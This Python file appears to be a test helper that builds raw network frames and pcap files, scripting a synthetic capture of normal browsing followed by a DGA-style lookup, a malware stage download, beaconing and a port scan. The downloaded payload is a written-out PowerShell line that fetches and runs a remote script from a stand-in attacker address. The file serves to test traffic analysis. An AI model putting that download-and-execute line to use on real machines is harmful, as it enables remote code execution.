MAC_GW = bytes.fromhex("0a1b2c3d4e02")        # gateway / DNS 192.0.2.1
MAC_SCAN = bytes.fromhex("0a1b2c3d4e03")      # scanner 198.51.100.77 (via gateway in reality; simplified)


def checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"
    total = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    while total >> 16:
        total = (total & 0xFFFF) + (total >> 16)
    return (~total) & 0xFFFF


def ethernet(src: bytes, dst: bytes, ethertype: int, payload: bytes, vlan=None) -> bytes:
    if vlan is not None:
        return dst + src + struct.pack("!HHH", 0x8100, vlan, ethertype) + payload
    return dst + src + struct.pack("!H", ethertype) + payload


def ipv4(src: str, dst: str, proto: int, payload: bytes, ttl=64, ident=0x1234) -> bytes:
    import ipaddress
    total = 20 + len(payload)
    head = struct.pack("!BBHHHBBH4s4s", 0x45, 0, total, ident, 0x4000, ttl, proto, 0,
                       ipaddress.IPv4Address(src).packed, ipaddress.IPv4Address(dst).packed)
    head = head[:10] + struct.pack("!H", checksum(head)) + head[12:]
    return head + payload


def ipv6(src: str, dst: str, nxt: int, payload: bytes, hop=64) -> bytes:
    import ipaddress
    return struct.pack("!IHBB", 0x60000000, len(payload), nxt, hop) + ipaddress.IPv6Address(src).packed + \
        ipaddress.IPv6Address(dst).packed + payload


def tcp(sport: int, dport: int, flags: str, payload: bytes = b"", seq=1000, ack=0, window=65535) -> bytes:
    bits = 0
    for name, bit in (("F", 1), ("S", 2), ("R", 4), ("P", 8), ("A", 16), ("U", 32)):
        if name in flags:
            bits |= bit
    return struct.pack("!HHIIHHHH", sport, dport, seq, ack, (5 << 12) | bits, window, 0, 0) + payload


def udp(sport: int, dport: int, payload: bytes) -> bytes:
    return struct.pack("!HHHH", sport, dport, 8 + len(payload), 0) + payload


def icmp_echo(reply: bool, ident=0x42, seq=1, payload=b"abcdefgh") -> bytes:
    head = struct.pack("!BBHHH", 0 if reply else 8, 0, 0, ident, seq) + payload
    return head[:2] + struct.pack("!H", checksum(head)) + head[4:]


def arp(op: int, sha: bytes, spa: str, tha: bytes, tpa: str) -> bytes:
    import ipaddress
    return struct.pack("!HHBBH", 1, 0x0800, 6, 4, op) + sha + ipaddress.IPv4Address(spa).packed + tha + \
        ipaddress.IPv4Address(tpa).packed


def dns_name(name: str) -> bytes:
    out = b""
    for label in name.strip(".").split("."):
        out += bytes([len(label)]) + label.encode()
    return out + b"\x00"


def dns_query(ident: int, name: str, qtype=1) -> bytes:
    return struct.pack("!HHHHHH", ident, 0x0100, 1, 0, 0, 0) + dns_name(name) + struct.pack("!HH", qtype, 1)


def dns_response(ident: int, name: str, answers, rcode=0, qtype=1) -> bytes:
    """answers: list of (type, value) where value is an IPv4 text, IPv6 text or a name (CNAME)."""
    import ipaddress
    msg = struct.pack("!HHHHHH", ident, 0x8180 | rcode, 1, len(answers), 0, 0) + dns_name(name) + struct.pack("!HH", qtype, 1)
    for rtype, value in answers:
        if rtype == 1:
            rdata = ipaddress.IPv4Address(value).packed
        elif rtype == 28:
            rdata = ipaddress.IPv6Address(value).packed
        elif rtype in (5, 2, 12):
            rdata = dns_name(value)
        elif rtype == 16:
            rdata = bytes([len(value)]) + value.encode()
        else:
            rdata = value
        msg += b"\xc0\x0c" + struct.pack("!HHIH", rtype, 1, 300, len(rdata)) + rdata
    return msg


def http_request(method: str, path: str, host: str, user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                 extra="") -> bytes:
    return (f"{method} {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {user_agent}\r\nAccept: */*\r\n{extra}"
            "Connection: close\r\n\r\n").encode()


def http_response(status=200, reason="OK", content_type="text/html", body=b"<html>ok</html>") -> bytes:
    return (f"HTTP/1.1 {status} {reason}\r\nServer: nginx\r\nContent-Type: {content_type}\r\n"
            f"Content-Length: {len(body)}\r\n\r\n").encode() + body


def tls_client_hello(sni: str, version=0x0303, alpn=("h2", "http/1.1"), tls13=False) -> bytes:
    suites = b"".join(struct.pack("!H", s) for s in (0x1301, 0x1302, 0xC02B, 0xC02F, 0x009C))
    exts = b""
    name = sni.encode()
    sni_ext = struct.pack("!HBH", len(name) + 3, 0, len(name)) + name
    exts += struct.pack("!HH", 0, len(sni_ext)) + sni_ext
    if alpn:
        protos = b"".join(bytes([len(a)]) + a.encode() for a in alpn)
        body = struct.pack("!H", len(protos)) + protos
        exts += struct.pack("!HH", 16, len(body)) + body
    if tls13:
        body = b"\x04\x03\x04\x03\x03"
        exts += struct.pack("!HH", 43, len(body)) + body
    hello = struct.pack("!H", version) + bytes(range(32)) + b"\x00" + struct.pack("!H", len(suites)) + suites + \
        b"\x01\x00" + struct.pack("!H", len(exts)) + exts
    handshake = b"\x01" + len(hello).to_bytes(3, "big") + hello
    return struct.pack("!BHH", 0x16, 0x0301, len(handshake)) + handshake


def tls_server_hello(version=0x0303, suite=0xC02F) -> bytes:
    hello = struct.pack("!H", version) + bytes(32) + b"\x00" + struct.pack("!H", suite) + b"\x00" + b"\x00\x00"
    handshake = b"\x02" + len(hello).to_bytes(3, "big") + hello
    return struct.pack("!BHH", 0x16, 0x0303, len(handshake)) + handshake


def pcap_file(frames, link=1, nanos=False, big=False) -> bytes:
    """frames: list of (timestamp, bytes). Classic pcap."""
    e = ">" if big else "<"
    magic = 0xA1B23C4D if nanos else 0xA1B2C3D4
    out = bytearray(struct.pack(e + "IHHiIII", magic, 2, 4, 0, 0, 262144, link))
    for ts, frame in frames:
        sec = int(ts)
        frac = int(round((ts - sec) * (1e9 if nanos else 1e6)))
        out += struct.pack(e + "IIII", sec, frac, len(frame), len(frame)) + frame
    return bytes(out)


def pcapng_file(frames, link=1, iface_name="eth0", big=False) -> bytes:
    e = ">" if big else "<"

    def block(kind, body):
        body += b"\x00" * (-len(body) % 4)
        length = 12 + len(body)
        return struct.pack(e + "II", kind, length) + body + struct.pack(e + "I", length)

    def option(code, value):
        return struct.pack(e + "HH", code, len(value)) + value + b"\x00" * (-len(value) % 4)

    shb_body = struct.pack(e + "IHHq", 0x1A2B3C4D, 1, 0, -1) + option(3, b"TB test writer") + option(0, b"")
    out = bytearray(block(0x0A0D0D0A, shb_body))
    idb_body = struct.pack(e + "HHI", link, 0, 262144) + option(2, iface_name.encode()) + option(9, b"\x06") + option(0, b"")
    out += block(1, idb_body)
    for ts, frame in frames:
        micro = int(round(ts * 1e6))
        body = struct.pack(e + "IIIII", 0, micro >> 32, micro & 0xFFFFFFFF, len(frame), len(frame)) + frame
        out += block(6, body)
    return bytes(out)


def sample_capture():
    """The synthetic story behind apps/data/sample.pcap: (timestamp, frame) pairs.

    Workstation 192.0.2.10 (TEST-NET-1) looks up names, browses www.example.com
    over HTTP and TLS, then resolves a random-looking name, fetches stage2.ps1
    from a bare IP (198.51.100.200) and opens TLS to an odd server name.
    Scanner 198.51.100.77 then probes 25 ports; only 22, 80 and 445 answer.
    """
    WS, GW, DNS = "192.0.2.10", "192.0.2.1", "192.0.2.1"
    SCANNER, BAD, WEB = "198.51.100.77", "198.51.100.200", "203.0.113.50"
    frames = []
    t = [T0]

    def tick(step=0.05):
        t[0] = round(t[0] + step, 6)
        return t[0]

    def add(frame, step=0.05):
        frames.append((tick(step), frame))

    # ARP for the gateway
    add(ethernet(MAC_WS, b"\xff" * 6, 0x0806, arp(1, MAC_WS, WS, b"\x00" * 6, GW)))
    add(ethernet(MAC_GW, MAC_WS, 0x0806, arp(2, MAC_GW, GW, MAC_WS, WS)), 0.001)
    # Normal DNS + HTTP + TLS to www.example.com
    add(ethernet(MAC_WS, MAC_GW, 0x0800, ipv4(WS, DNS, 17, udp(51000, 53, dns_query(0x1001, "www.example.com")))))
    add(ethernet(MAC_GW, MAC_WS, 0x0800, ipv4(DNS, WS, 17, udp(53, 51000, dns_response(0x1001, "www.example.com", [(1, WEB)])))), 0.02)
    add(ethernet(MAC_WS, MAC_GW, 0x0800, ipv4(WS, WEB, 6, tcp(51001, 80, "S", seq=100))))
    add(ethernet(MAC_GW, MAC_WS, 0x0800, ipv4(WEB, WS, 6, tcp(80, 51001, "SA", seq=500, ack=101))), 0.03)
    add(ethernet(MAC_WS, MAC_GW, 0x0800, ipv4(WS, WEB, 6, tcp(51001, 80, "A", seq=101, ack=501))), 0.001)
    add(ethernet(MAC_WS, MAC_GW, 0x0800, ipv4(WS, WEB, 6, tcp(51001, 80, "PA", http_request("GET", "/", "www.example.com"), seq=101, ack=501))), 0.001)
    add(ethernet(MAC_GW, MAC_WS, 0x0800, ipv4(WEB, WS, 6, tcp(80, 51001, "PA", http_response(), seq=501, ack=300))), 0.04)
    add(ethernet(MAC_WS, MAC_GW, 0x0800, ipv4(WS, WEB, 6, tcp(51002, 443, "S", seq=200))))
    add(ethernet(MAC_GW, MAC_WS, 0x0800, ipv4(WEB, WS, 6, tcp(443, 51002, "SA", seq=900, ack=201))), 0.03)
    add(ethernet(MAC_WS, MAC_GW, 0x0800, ipv4(WS, WEB, 6, tcp(51002, 443, "PA", tls_client_hello("www.example.com"), seq=201, ack=901))), 0.001)
    add(ethernet(MAC_GW, MAC_WS, 0x0800, ipv4(WEB, WS, 6, tcp(443, 51002, "PA", tls_server_hello(), seq=901, ack=400))), 0.03)
    # IPv6 DNS lookup (AAAA) on a VLAN-tagged frame
    add(ethernet(MAC_WS, MAC_GW, 0x86DD, ipv6("2001:db8::10", "2001:db8::53", 17, udp(51003, 53, dns_query(0x1002, "mail.example.com", 28))), vlan=20))
    add(ethernet(MAC_GW, MAC_WS, 0x86DD, ipv6("2001:db8::53", "2001:db8::10", 17, udp(53, 51003, dns_response(0x1002, "mail.example.com", [(28, "2001:db8:1::25")], qtype=28))), vlan=20), 0.02)
    # Ping
    add(ethernet(MAC_WS, MAC_GW, 0x0800, ipv4(WS, GW, 1, icmp_echo(False))))
    add(ethernet(MAC_GW, MAC_WS, 0x0800, ipv4(GW, WS, 1, icmp_echo(True))), 0.002)
    # The suspicious part: DGA-looking name, NXDOMAIN, then a bare-IP download and odd TLS name
    add(ethernet(MAC_WS, MAC_GW, 0x0800, ipv4(WS, DNS, 17, udp(51004, 53, dns_query(0x1003, "xk3v9q2mz7w1pq8r.example-cdn.top")))), 2.0)
    add(ethernet(MAC_GW, MAC_WS, 0x0800, ipv4(DNS, WS, 17, udp(53, 51004, dns_response(0x1003, "xk3v9q2mz7w1pq8r.example-cdn.top", [], rcode=3)))), 0.02)
    add(ethernet(MAC_WS, MAC_GW, 0x0800, ipv4(WS, DNS, 17, udp(51005, 53, dns_query(0x1004, "update-check.example-cdn.top")))), 0.5)
    add(ethernet(MAC_GW, MAC_WS, 0x0800, ipv4(DNS, WS, 17, udp(53, 51005, dns_response(0x1004, "update-check.example-cdn.top", [(5, "edge.example-cdn.top"), (1, BAD)])))), 0.02)
    add(ethernet(MAC_WS, MAC_GW, 0x0800, ipv4(WS, BAD, 6, tcp(51006, 80, "S", seq=300))), 0.1)
    add(ethernet(MAC_GW, MAC_WS, 0x0800, ipv4(BAD, WS, 6, tcp(80, 51006, "SA", seq=700, ack=301))), 0.08)
    add(ethernet(MAC_WS, MAC_GW, 0x0800, ipv4(WS, BAD, 6, tcp(51006, 80, "PA", http_request(
        "GET", "/stage2.ps1", BAD, user_agent="Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"), seq=301, ack=701))), 0.001)
    body = b"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.200/stage3.ps1')\r\n"
    add(ethernet(MAC_GW, MAC_WS, 0x0800, ipv4(BAD, WS, 6, tcp(80, 51006, "PA", http_response(
        content_type="application/octet-stream", body=body), seq=701, ack=500))), 0.09)
    add(ethernet(MAC_WS, MAC_GW, 0x0800, ipv4(WS, BAD, 6, tcp(51007, 443, "S", seq=400))), 0.3)
    add(ethernet(MAC_GW, MAC_WS, 0x0800, ipv4(BAD, WS, 6, tcp(443, 51007, "SA", seq=800, ack=401))), 0.08)
    add(ethernet(MAC_WS, MAC_GW, 0x0800, ipv4(WS, BAD, 6, tcp(51007, 443, "PA", tls_client_hello(
        "login.example-secure.top", alpn=(), tls13=True), seq=401, ack=801))), 0.001)
    # Beaconing: three more TLS hellos to the odd name, 10 seconds apart
    for i in range(3):
        add(ethernet(MAC_WS, MAC_GW, 0x0800, ipv4(WS, BAD, 6, tcp(51010 + i, 443, "S", seq=1000 + i))), 10.0)
        add(ethernet(MAC_GW, MAC_WS, 0x0800, ipv4(BAD, WS, 6, tcp(443, 51010 + i, "SA", seq=2000, ack=1001 + i))), 0.08)
        add(ethernet(MAC_WS, MAC_GW, 0x0800, ipv4(WS, BAD, 6, tcp(51010 + i, 443, "PA", tls_client_hello(
            "login.example-secure.top", alpn=(), tls13=True), seq=1001 + i, ack=2001))), 0.001)
    # Port scan from 198.51.100.77 against the workstation
    ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1433, 1723, 2049, 3306, 3389,
             5900, 5985, 6379, 8080, 8443]
    open_ports = {22, 80, 445}
    for i, port in enumerate(ports):
        add(ethernet(MAC_SCAN, MAC_WS, 0x0800, ipv4(SCANNER, WS, 6, tcp(40000 + i, port, "S", seq=5000 + i), ttl=54)), 0.01)
        if port in open_ports:
            add(ethernet(MAC_WS, MAC_SCAN, 0x0800, ipv4(WS, SCANNER, 6, tcp(port, 40000 + i, "SA", seq=1, ack=5001 + i))), 0.001)
            add(ethernet(MAC_SCAN, MAC_WS, 0x0800, ipv4(SCANNER, WS, 6, tcp(40000 + i, port, "R", seq=5001 + i), ttl=54)), 0.001)
        else:
            add(ethernet(MAC_WS, MAC_SCAN, 0x0800, ipv4(WS, SCANNER, 6, tcp(port, 40000 + i, "RA", seq=0, ack=5001 + i))), 0.001)
    # SSH banner grab by the scanner
    add(ethernet(MAC_SCAN, MAC_WS, 0x0800, ipv4(SCANNER, WS, 6, tcp(40100, 22, "S", seq=6000), ttl=54)), 0.5)
    add(ethernet(MAC_WS, MAC_SCAN, 0x0800, ipv4(WS, SCANNER, 6, tcp(22, 40100, "SA", seq=1, ack=6001))), 0.001)
    add(ethernet(MAC_SCAN, MAC_WS, 0x0800, ipv4(SCANNER, WS, 6, tcp(40100, 22, "A", seq=6001, ack=2), ttl=54)), 0.001)
    add(ethernet(MAC_WS, MAC_SCAN, 0x0800, ipv4(WS, SCANNER, 6, tcp(22, 40100, "PA", b"SSH-2.0-OpenSSH_9.6\r\n", seq=2, ack=6001))), 0.01)
    return frames


def sample_pcap_bytes() -> bytes:
    return pcap_file(sample_capture())
